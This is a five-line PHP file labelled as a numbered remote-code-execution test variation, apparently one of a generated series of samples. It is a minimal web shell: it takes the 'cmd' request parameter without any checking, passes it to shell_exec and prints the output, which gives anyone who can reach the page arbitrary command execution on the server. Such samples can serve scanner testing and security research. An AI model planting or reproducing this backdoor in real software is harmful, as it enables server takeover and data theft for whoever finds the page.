<?php
// RCE test variation #891
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>